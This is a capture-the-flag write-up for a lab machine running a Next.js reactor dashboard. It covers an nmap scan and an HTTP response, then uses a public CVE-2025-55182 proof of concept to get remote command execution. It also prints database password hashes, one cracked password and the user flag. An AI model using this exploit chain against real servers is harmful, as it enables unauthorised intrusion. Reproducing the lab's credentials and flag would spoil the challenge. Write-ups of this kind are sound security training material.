
**Findings**

```
nmap -sV 10.129.5.170 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-29 22:20 +0530
Nmap scan report for 10.129.5.170
Host is up (0.50s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
3000/tcp open  ppp?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.98%I=7%D=5/29%Time=6A19C3DD%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,34BC,"HTTP/1\.1\x20200\x20OK\r\nVary:\x20RSC,\x20Next-Router-S
SF:tate-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch,\x2
SF:0Accept-Encoding\r\nx-nextjs-cache:\x20HIT\r\nx-nextjs-prerender:\x201\
SF:r\nx-nextjs-stale-time:\x204294967294\r\nX-Powered-By:\x20Next\.js\r\nC
SF:ache-Control:\x20s-maxage=31536000,\x20\r\nETag:\x20\"p02u6gnhufd8t\"\r
SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2017
SF:175\r\nDate:\x20Fri,\x2029\x20May\x202026\x2016:50:37\x20GMT\r\nConnect
SF:ion:\x20close\r\n\r\n<!DOCTYPE\x20html><html\x20lang=\"en\"><head><meta
SF:\x20charSet=\"utf-8\"/><meta\x20name=\"viewport\"\x20content=\"width=de
SF:vice-width,\x20initial-scale=1\"/><link\x20rel=\"stylesheet\"\x20href=\
SF:"/_next/static/css/414e1be982bc8557\.css\"\x20data-precedence=\"next\"/
SF:><link\x20rel=\"preload\"\x20as=\"script\"\x20fetchPriority=\"low\"\x20
SF:href=\"/_next/static/chunks/webpack-db0a529a99835594\.js\"/><script\x20
SF:src=\"/_next/static/chunks/4bd1b696-80bcaf75e1b4285e\.js\"\x20async=\"\
SF:"></script><script\x20src=\"/_next/static/chunks/517-d083b552e04dead1\.
SF:js\"\x20async=\"\"></script><script\x20s")%r(Help,2F,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(NCP,2F,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(HTTPOptio
SF:ns,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20RSC,\x20Next-Rou
SF:ter-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetc
SF:h\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x20private,\x20n
SF:o-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nDate:\x20Fri,
SF:\x2029\x20May\x202026\x2016:50:38\x20GMT\r\nConnection:\x20close\r\n\r\
SF:n")%r(RTSPRequest,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20R
SF:SC,\x20Next-Router-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-
SF:Segment-Prefetch\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x
SF:20private,\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r
SF:\nDate:\x20Fri,\x2029\x20May\x202026\x2016:50:39\x20GMT\r\nConnection:\
SF:x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.85 seconds

```


In the response of the burp , 

```
HTTP/1.1 200 OK
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
x-nextjs-cache: HIT
x-nextjs-prerender: 1
x-nextjs-stale-time: 4294967294
X-Powered-By: Next.js
Cache-Control: s-maxage=31536000, 
ETag: "p02u6gnhufd8t"
Content-Type: text/html; charset=utf-8
Date: Sat, 30 May 2026 05:23:35 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 17175

<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/414e1be982bc8557.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js" async=""></script><script src="/_next/static/chunks/517-d083b552e04dead1.js" async=""></script><script src="/_next/static/chunks/main-app-4fbb4b1f318e39a0.js" async=""></script><title>ReactorWatch | Core Monitoring System</title><meta name="description" content="Nuclear Reactor Core Monitoring Dashboard"/><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script></head><body><div><header class="header"><div class="logo"><div class="logo-icon"></div><div class="logo-text"><h1>REACTORWATCH</h1><span>CORE MONITORING SYSTEM v3.2.1</span></div></div><div class="status-badge"><div class="status-dot"></div><span>NOMINAL</span></div></header><div class="container"><div class="dashboard-grid"><div class="panel core-status"><div class="panel-header"><span class="panel-title">Core Status</span><div class="panel-indicator"></div></div><div class="core-visual"><div class="core-ring"></div><div class="core-ring"></div><div class="core-ring"></div><div class="core-center">OK</div></div><div class="core-stats"><div class="stat-item"><div class="stat-label">REACTOR POWER</div><div class="stat-value">98.2%</div></div><div class="stat-item"><div class="stat-label">NEUTRON FLUX</div><div class="stat-value">2.4E13</div></div><div class="stat-item"><div class="stat-label">CONTROL RODS</div><div class="stat-value">42/50</div></div><div class="stat-item"><div class="stat-label">CRITICALITY</div><div class="stat-value warning">1.0002</div></div></div></div><div class="panel metric-card"><div class="panel-header"><span class="panel-title">Core Temp</span><div class="panel-indicator"></div></div><div class="metric-value">324°<span class="metric-unit">C</span></div><div class="metric-bar"><div class="metric-bar-fill" style="width:65%"></div></div></div><div class="panel metric-card"><div class="panel-header"><span class="panel-title">Pressure</span><div class="panel-indicator"></div></div><div class="metric-value">155<span class="metric-unit">bar</span></div><div class="metric-bar"><div class="metric-bar-fill" style="width:72%"></div></div></div><div class="panel metric-card"><div class="panel-header"><span class="panel-title">Coolant Flow</span><div class="panel-indicator"></div></div><div class="metric-value caution">18.4<span class="metric-unit">k m³/h</span></div><div class="metric-bar"><div class="metric-bar-fill caution" style="width:84%"></div></div></div><div class="panel metric-card"><div class="panel-header"><span class="panel-title">Turbine Output</span><div class="panel-indicator"></div></div><div class="metric-value">1.21<span class="metric-unit">GW</span></div><div class="metric-bar"><div class="metric-bar-fill" style="width:91%"></div></div></div><div class="panel log-panel"><div class="panel-header"><span class="panel-title">System Logs</span><div class="panel-indicator"></div></div><div class="log-entries"><div class="log-entry"><span class="log-time">14:32:01</span><span class="log-level ok">OK</span><span class="log-message">Primary coolant loop operating within parameters</span></div><div class="log-entry"><span class="log-time">14:28:45</span><span class="log-level info">INFO</span><span class="log-message">Scheduled maintenance completed on turbine #2</span></div><div class="log-entry"><span class="log-time">14:15:22</span><span class="log-level warn">WARN</span><span class="log-message">Minor fluctuation detected in secondary loop pressure</span></div><div class="log-entry"><span class="log-time">14:02:18</span><span class="log-level ok">OK</span><span class="log-message">Control rod position calibration successful</span></div><div class="log-entry"><span class="log-time">13:45:33</span><span class="log-level info">INFO</span><span class="log-message">Shift change: Day crew reporting for duty</span></div></div></div><div class="panel staff-panel"><div class="panel-header"><span class="panel-title">On-Site Personnel</span><div class="panel-indicator"></div></div><div class="staff-list"><div class="staff-member"><div class="staff-avatar">DR</div><div class="staff-info"><div class="staff-name">Dr. Elena Rodriguez</div><div class="staff-role">Lead Nuclear Engineer</div></div><div class="staff-status online">ONLINE</div></div><div class="staff-member"><div class="staff-avatar">MK</div><div class="staff-info"><div class="staff-name">Marcus Kim</div><div class="staff-role">Senior Technician</div></div><div class="staff-status online">ONLINE</div></div><div class="staff-member"><div class="staff-avatar">JT</div><div class="staff-info"><div class="staff-name">James Thompson</div><div class="staff-role">Safety Officer</div></div><div class="staff-status offline">OFFLINE</div></div></div></div></div><footer class="footer">REACTORWATCH™ © 2025 NUCLEAR DYNAMICS CORP. | FACILITY: SITE-7 | CLASSIFICATION: RESTRICTED</footer></div></div><script src="/_next/static/chunks/webpack-db0a529a99835594.js" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"2:\"$Sreact.fragment\"\n3:I[5244,[],\"\"]\n4:I[3866,[],\"\"]\n5:I[6213,[],\"OutletBoundary\"]\n7:I[6213,[],\"MetadataBoundary\"]\n9:I[6213,[],\"ViewportBoundary\"]\nb:I[4835,[],\"\"]\n1:HL[\"/_next/static/css/414e1be982bc8557.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"L3bimJe_3LvBcFWAnK5L4\",\"p\":\"\",\"c\":[\"\",\"\"],\"i\":false,\"f\":[[[\"\",{\"children\":[\"__PAGE__\",{}]},\"$undefined\",\"$undefined\",true],[\"\",[\"$\",\"$2\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/414e1be982bc8557.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[\"$\",\"body\",null,{\"children\":[\"$\",\"$L3\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L4\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":\"404\"}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]],\"notFoundStyles\":[]}]}]}]]}],{\"children\":[\"__PAGE__\",[\"$\",\"$2\",\"c\",{\"children\":[[\"$\",\"div\",null,{\"children\":[[\"$\",\"header\",null,{\"className\":\"header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"logo\",\"children\":[[\"$\",\"div\",null,{\"className\":\"logo-icon\"}],[\"$\",\"div\",null,{\"className\":\"logo-text\",\"children\":[[\"$\",\"h1\",null,{\"children\":\"REACTORWATCH\"}],[\"$\",\"span\",null,{\"children\":\"CORE MONITORING SYSTEM v3.2.1\"}]]}]]}],[\"$\",\"div\",null,{\"className\":\"status-badge\",\"children\":[[\"$\",\"div\",null,{\"className\":\"status-dot\"}],[\"$\",\"span\",null,{\"children\":\"NOMINAL\"}]]}]]}],[\"$\",\"div\",null,{\"className\":\"container\",\"children\":[[\"$\",\"div\",null,{\"className\":\"dashboard-grid\",\"children\":[[\"$\",\"div\",null,{\"className\":\"panel core-status\",\"children\":[[\"$\",\"div\",null,{\"className\":\"panel-header\",\"children\":[[\"$\",\"span\",null,{\"className\":\"panel-title\",\"children\":\"Core Status\"}],[\"$\",\"div\",null,{\"className\":\"panel-indicator\"}]]}],[\"$\",\"div\",null,{\"className\":\"core-visual\",\"children\":[[\"$\",\"div\",null,{\"className\":\"core-ring\"}],[\"$\",\"div\",null,{\"className\":\"core-ring\"}],[\"$\",\"div\",null,{\"className\":\"core-ring\"}],[\"$\",\"div\",null,{\"className\":\"core-center\",\"children\":\"OK\"}]]}],[\"$\",\"div\",null,{\"className\":\"core-stats\",\"children\":[[\"$\",\"div\",null,{\"className\":\"stat-item\",\"children\":[[\"$\",\"div\",null,{\"className\":\"stat-label\",\"children\":\"REACTOR POWER\"}],[\"$\",\"div\",null,{\"className\":\"stat-value\",\"children\":\"98.2%\"}]]}],[\"$\",\"div\",null,{\"className\":\"stat-item\",\"children\":[[\"$\",\"div\",null,{\"className\":\"stat-label\",\"children\":\"NEUTRON FLUX\"}],[\"$\",\"div\",null,{\"className\":\"stat-value\",\"children\":\"2.4E13\"}]]}],[\"$\",\"div\",null,{\"className\":\"stat-item\",\"children\":[[\"$\",\"div\",null,{\"className\":\"stat-label\",\"children\":\"CONTROL RODS\"}],[\"$\",\"div\",null,{\"className\":\"stat-value\",\"children\":\"42/50\"}]]}],[\"$\",\"div\",null,{\"className\":\"stat-item\",\"children\":[[\"$\",\"div\",null,{\"className\":\"stat-label\",\"children\":\"CRITICALITY\"}],[\"$\",\"div\",null,{\"className\":\"stat-value warning\",\"children\":\"1.0002\"}]]}]]}]]}],[\"$\",\"div\",null,{\"className\":\"panel metric-card\",\"children\":[[\"$\",\"div\",null,{\"className\":\"panel-header\",\"children\":[[\"$\",\"span\",null,{\"className\":\"panel-title\",\"children\":\"Core Temp\"}],[\"$\",\"div\",null,{\"className\":\"panel-indicator\"}]]}],[\"$\",\"div\",null,{\"className\":\"metric-value\",\"children\":[\"324°\",[\"$\",\"span\",null,{\"className\":\"metric-unit\",\"children\":\"C\"}]]}],[\"$\",\"div\",null,{\"className\":\"metric-bar\",\"children\":[\"$\",\"div\",null,{\"className\":\"metric-bar-fill\",\"style\":{\"width\":\"65%\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"panel metric-card\",\"children\":[[\"$\",\"div\",null,{\"className\":\"panel-header\",\"children\":[[\"$\",\"span\",null,{\"className\":\"panel-title\",\"children\":\"Pressure\"}],[\"$\",\"div\",null,{\"className\":\"panel-indicator\"}]]}],[\"$\",\"div\",null,{\"className\":\"metric-value\",\"children\":[\"155\",[\"$\",\"span\",null,{\"className\":\"metric-unit\",\"children\":\"bar\"}]]}],[\"$\",\"div\",null,{\"className\":\"metric-bar\",\"children\":[\"$\",\"div\",null,{\"className\":\"metric-bar-fill\",\"style\":{\"width\":\"72%\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"panel metric-card\",\"children\":[[\"$\",\"div\",null,{\"className\":\"panel-header\",\"children\":[[\"$\",\"span\",null,{\"className\":\"panel-title\",\"children\":\"Coolant Flow\"}],[\"$\",\"div\",null,{\"className\":\"panel-indicator\"}]]}],[\"$\",\"div\",null,{\"className\":\"metric-value caution\",\"children\":[\"18.4\",[\"$\",\"span\",null,{\"className\":\"metric-unit\",\"children\":\"k m³/h\"}]]}],[\"$\",\"div\",null,{\"className\":\"metric-bar\",\"children\":[\"$\",\"div\",null,{\"className\":\"metric-bar-fill caution\",\"style\":{\"width\":\"84%\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"panel metric-card\",\"children\":[[\"$\",\"div\",null,{\"className\":\"panel-header\",\"children\":[[\"$\",\"span\",null,{\"className\":\"panel-title\",\"children\":\"Turbine Output\"}],[\"$\",\"div\",null,{\"className\":\"panel-indicator\"}]]}],[\"$\",\"div\",null,{\"className\":\"metric-value\",\"children\":[\"1.21\",[\"$\",\"span\",null,{\"className\":\"metric-unit\",\"children\":\"GW\"}]]}],[\"$\",\"div\",null,{\"className\":\"metric-bar\",\"children\":[\"$\",\"div\",null,{\"className\":\"metric-bar-fill\",\"style\":{\"width\":\"91%\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"panel log-panel\",\"children\":[[\"$\",\"div\",null,{\"className\":\"panel-header\",\"children\":[[\"$\",\"span\",null,{\"className\":\"panel-title\",\"children\":\"System Logs\"}],[\"$\",\"div\",null,{\"className\":\"panel-indicator\"}]]}],[\"$\",\"div\",null,{\"className\":\"log-entries\",\"children\":[[\"$\",\"div\",null,{\"className\":\"log-entry\",\"children\":[[\"$\",\"span\",null,{\"className\":\"log-time\",\"children\":\"14:32:01\"}],[\"$\",\"span\",null,{\"className\":\"log-level ok\",\"children\":\"OK\"}],[\"$\",\"span\",null,{\"className\":\"log-message\",\"children\":\"Primary coolant loop operating within parameters\"}]]}],[\"$\",\"div\",null,{\"className\":\"log-entry\",\"children\":[[\"$\",\"span\",null,{\"className\":\"log-time\",\"children\":\"14:28:45\"}],[\"$\",\"span\",null,{\"className\":\"log-level info\",\"children\":\"INFO\"}],[\"$\",\"span\",null,{\"className\":\"log-message\",\"children\":\"Scheduled maintenance completed on turbine #2\"}]]}],[\"$\",\"div\",null,{\"className\":\"log-entry\",\"children\":[[\"$\",\"span\",null,{\"className\":\"log-time\",\"children\":\"14:15:22\"}],[\"$\",\"span\",null,{\"className\":\"log-level warn\",\"children\":\"WARN\"}],[\"$\",\"span\",null,{\"className\":\"log-message\",\"children\":\"Minor fluctuation detected in secondary loop pressure\"}]]}],[\"$\",\"div\",null,{\"className\":\"log-entry\",\"children\":[[\"$\",\"span\",null,{\"className\":\"log-time\",\"children\":\"14:02:18\"}],[\"$\",\"span\",null,{\"className\":\"log-level ok\",\"children\":\"OK\"}],[\"$\",\"span\",null,{\"className\":\"log-message\",\"children\":\"Control rod position calibration successful\"}]]}],[\"$\",\"div\",null,{\"className\":\"log-entry\",\"children\":[[\"$\",\"span\",null,{\"className\":\"log-time\",\"children\":\"13:45:33\"}],[\"$\",\"span\",null,{\"className\":\"log-level info\",\"children\":\"INFO\"}],[\"$\",\"span\",null,{\"className\":\"log-message\",\"children\":\"Shift change: Day crew reporting for duty\"}]]}]]}]]}],[\"$\",\"div\",null,{\"className\":\"panel staff-panel\",\"children\":[[\"$\",\"div\",null,{\"className\":\"panel-header\",\"children\":[[\"$\",\"span\",null,{\"className\":\"panel-title\",\"children\":\"On-Site Personnel\"}],[\"$\",\"div\",null,{\"className\":\"panel-indicator\"}]]}],[\"$\",\"div\",null,{\"className\":\"staff-list\",\"children\":[[\"$\",\"div\",null,{\"className\":\"staff-member\",\"children\":[[\"$\",\"div\",null,{\"className\":\"staff-avatar\",\"children\":\"DR\"}],[\"$\",\"div\",null,{\"className\":\"staff-info\",\"children\":[[\"$\",\"div\",null,{\"className\":\"staff-name\",\"children\":\"Dr. Elena Rodriguez\"}],[\"$\",\"div\",null,{\"className\":\"staff-role\",\"children\":\"Lead Nuclear Engineer\"}]]}],[\"$\",\"div\",null,{\"className\":\"staff-status online\",\"children\":\"ONLINE\"}]]}],[\"$\",\"div\",null,{\"className\":\"staff-member\",\"children\":[[\"$\",\"div\",null,{\"className\":\"staff-avatar\",\"children\":\"MK\"}],[\"$\",\"div\",null,{\"className\":\"staff-info\",\"children\":[[\"$\",\"div\",null,{\"className\":\"staff-name\",\"children\":\"Marcus Kim\"}],[\"$\",\"div\",null,{\"className\":\"staff-role\",\"children\":\"Senior Technician\"}]]}],[\"$\",\"div\",null,{\"className\":\"staff-status online\",\"children\":\"ONLINE\"}]]}],[\"$\",\"div\",null,{\"className\":\"staff-member\",\"children\":[[\"$\",\"div\",null,{\"className\":\"staff-avatar\",\"children\":\"JT\"}],[\"$\",\"div\",null,{\"className\":\"staff-info\",\"children\":[[\"$\",\"div\",null,{\"className\":\"staff-name\",\"children\":\"James Thompson\"}],[\"$\",\"div\",null,{\"className\":\"staff-role\",\"children\":\"Safety Officer\"}]]}],[\"$\",\"div\",null,{\"className\":\"staff-status offline\",\"children\":\"OFFLINE\"}]]}]]}]]}]]}],[\"$\",\"footer\",null,{\"className\":\"footer\",\"children\":\"REACTORWATCH™ © 2025 NUCLEAR DYNAMICS CORP. | FACILITY: SITE-7 | CLASSIFICATION: RESTRICTED\"}]]}]]}],null,[\"$\",\"$L5\",null,{\"children\":\"$L6\"}]]}],{},null]},null],[\"$\",\"$2\",\"h\",{\"children\":[null,[\"$\",\"$2\",\"odCkXeObJtnWLexaH-Dfw\",{\"children\":[[\"$\",\"$L7\",null,{\"children\":\"$L8\"}],[\"$\",\"$L9\",null,{\"children\":\"$La\"}],null]}]]}]]],\"m\":\"$undefined\",\"G\":[\"$b\",\"$undefined\"],\"s\":false,\"S\":true}\n"])</script><script>self.__next_f.push([1,"a:[[\"$\",\"meta\",\"0\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\n8:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"title\",\"1\",{\"children\":\"ReactorWatch | Core Monitoring System\"}],[\"$\",\"meta\",\"2\",{\"name\":\"description\",\"content\":\"Nuclear Reactor Core Monitoring Dashboard\"}]]\n"])</script><script>self.__next_f.push([1,"6:null\n"])</script></body></html>
```


it the vary it uses the RSC  , 

by searching the RSC in the google , and got the CVE of the RSC in Next.js  `https://github.com/nehkark/CVE-2025-55182`

```
python poc-cve-2025-55182.py -u http://10.129.5.225:3000 -c "ls"
React2Shell PoC - CVE-2025-55182
---------------------------------

[+] Target URL : http://10.129.5.225:3000
[+] Command    : ls

[+] Sending crafted Flight payload...
[+] HTTP status: 500

[✓] RCE confirmed. Command output:

    app\nnext.config.js\nnode_modules\npackage.json\npackage-lock.json\nreactor.db
```

and in the DB , we got 

```
username: engineer
hash: 39d97110eafe2a9a68639812cd271e8e
role: operator
email: engineer@reactor.htb

username: admin  
hash: a203b22191d744a4e70ada5c101b17b8
role: administrator
email: admin@reactor.htb
```

password of the engineer in `reactor1`

and go in the shell of engineer , and got user.txt

```
engineer@reactor:~$ ls
user.txt
engineer@reactor:~$ cat user.txt 
a23598ecb12d816c3ba830f294e2c569

```

